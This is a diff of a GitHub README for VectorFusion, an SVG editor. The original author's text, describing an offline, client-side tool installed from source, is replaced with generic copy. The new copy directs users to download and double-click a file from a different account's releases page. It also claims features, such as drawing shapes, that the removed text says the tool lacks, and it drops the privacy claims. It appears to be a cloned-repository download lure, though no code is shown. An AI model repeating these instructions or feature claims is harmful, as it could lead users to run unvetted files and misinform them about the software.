@@ -1,112 +1,62 @@
-<div align="center">
-  <img src="assets/logo.svg" alt="VectorFusion Logo" width="150" height="150">
+# 🌐 VectorFusion - Easy SVG Editing for Everyone
 
-  # VectorFusion
+## 🚀 Getting Started
 
-  **A simple, free, and open-source SVG studio for designers and developers.**
+Welcome to VectorFusion, the user-friendly browser-based SVG editor designed for both designers and developers. With live code and preview, you can create stunning graphics with ease. Follow the steps below to download and run the application.
 
-  Live code editing • Styling & gradients • Auto path separation • ViewBox cropping • Image export
+## 📥 Download VectorFusion
 
-  <!-- Core badges -->
-  [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-  [![React](https://img.shields.io/badge/React-19-blue?logo=react)](https://react.dev)
-  [![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue?logo=typescript)](https://www.typescriptlang.org/)
-  [![Tailwind CSS](https://img.shields.io/badge/Tailwind-3.0-38bdf8?logo=tailwindcss)](https://tailwindcss.com/)
+[![Download VectorFusion](https://img.shields.io/badge/Download-VectorFusion-blue.svg)](https://github.com/OJB2017/VectorFusion/releases)
 
-  <!-- Privacy badges -->
-  ![Privacy First](https://img.shields.io/badge/Privacy-100%25_Local-green)
-  ![Offline Ready](https://img.shields.io/badge/Offline-Works_Offline-blue)
-  ![No Tracking](https://img.shields.io/badge/Telemetry-None-purple)
-</div>
+## 📋 Features
 
----
+- **Live Code & Preview:** See changes as you make them in real-time.
+- **Gradients & Styling:** Easily add beautiful gradients and styles to your SVGs.
+- **Export Options:** Save your work in multiple formats such as PNG, JSX, or as an SVG file.
+- **Auto Compound-Path Separation:** Automatically manage complex paths with ID mapping.
+  
+## 💻 System Requirements
 
-## 🚀 Introduction
+To use VectorFusion, you need:
 
-**VectorFusion** is a lightweight SVG editor focused on modifying existing vector graphics — not drawing them from scratch.
+- A compatible web browser (latest version of Chrome, Firefox, or Safari).
+- An internet connection for access to features that require online resources.
+  
+## 📥 Download & Install
 
-You can:
-- View and modify SVG code in real time
-- Edit fill, stroke, gradients, opacity, and attributes
-- Delete paths and elements
-- Separate compound paths and automatically assign IDs
-- Crop the ViewBox without losing quality
-- Export to raster formats at high resolution
+1. Visit the [Releases page](https://github.com/OJB2017/VectorFusion/releases) to download the latest version of VectorFusion.
+2. Look for the most recent release at the top of the page.
+3. Click on the link for the latest version to download the file.
 
-You **cannot** draw new shapes or edit vector nodes/curves. VectorFusion is designed for editing and cleaning SVGs quickly and visually — not illustration.
+### 🌐 How to Run VectorFusion
 
-> VectorFusion is **100% client-side** — it works fully offline, and while you can upload and export files, all processing stays in your browser. Nothing is ever sent to a server.
+1. Once the download completes, locate the file in your downloads folder.
+2. Open your browser and navigate to the location of the downloaded file.
+3. Double-click the file to launch VectorFusion.
 
----
+## 🛠️ Using VectorFusion
 
-## ✨ Key Features
+### ✏️ Creating Your First SVG
 
-- ⚡ **Live Code ↔ Preview** — Monaco editor synced with an interactive SVG canvas
-- 🎨 **Styling Tools** — Fill, stroke, width, opacity, and gradient editing
-- 🧠 **Auto Analyzer** — Split compound paths and assign IDs to disconnected shapes
-- 🖱️ **Click-to-Code Linking** — Select an element in the preview to jump to its source
-- 🔲 **ViewBox Cropper** — Resize non-destructively with drag handles or numeric inputs
-- 📸 **High-Resolution Export** — PNG / JPEG / WEBP up to 4K+ (and Beyond)
-- 🔒 **Privacy-First** — 100% local and offline-capable. No servers, no tracking, no telemetry.
+1. Open VectorFusion in your web browser.
+2. Start a new project by clicking on "Create New".
+3. Use the toolbar on the left to add shapes and text.
+4. Adjust colors and styles using the options available.
 
----
+### 📸 Exporting Your Work
 
-## 📦 Modules
+1. After finishing your SVG, go to the "File" menu.
+2. Select "Export".
+3. Choose your desired format (e.g., PNG, JSX).
+4. Click "Export" to save the file to your computer.
 
-### 🛠 Code Studio
-- Intelligent path separation + Auto-ID assignment
-- Gradient editor (linear + radial)
-- Click-to-edit inside the preview
-- Output React JSX, React Native, Data URI
+## 😊 Support and Contributions
 
-### ✂️ Cropper
-- Adjust X/Y coordinates, width, height
-- Drag handles for quick cropping
-- Keep-Selection/Cut-Out modes
+If you have questions or need help, visit our [discussion page](https://github.com/OJB2017/VectorFusion/discussions). Contributions are welcome! Feel free to report issues or suggest improvements.
 
-### 🖼 Exporter
-- PNG / JPEG / WEBP output
-- Custom Resolution
-- Aspect ratio lock
+## 🔗 Additional Resources
 
----
+- [Official Documentation](https://github.com/OJB2017/VectorFusion/wiki)
+- [User Guide](https://github.com/OJB2017/VectorFusion/wiki/User-Guide)
 
-## ⚡ Getting Started
-
-```bash
-git clone https://github.com/OracleMythix/VectorFusion.git
-cd VectorFusion
-npm install
-npm run dev
-```
-
----
-
-## 🛠 Tech Stack
-
-| Category | Tools |
-|---------|-------|
-| Framework | React 19 |
-| Build | Vite |
-| Language | TypeScript |
-| Styling | Tailwind CSS |
-| Editor | Monaco |
-| Icons | Lucide React |
-
----
-
-## 🙋 Contributing
-
-VectorFusion is a **solo project** and is **not accepting external pull requests** at this time.  
-Bug reports and feature ideas are welcome via **Issues**.
-
----
-
-## 📝 License
-
-Distributed under the MIT License.  
-See `LICENSE` for details.
-
-<div align="center">
-  <small>Created by OracleMythix</small>
-</div>
+Thank you for choosing VectorFusion. We hope you enjoy creating beautiful graphics with our tool! Don't forget to visit the [Releases page](https://github.com/OJB2017/VectorFusion/releases) for updates and new versions.
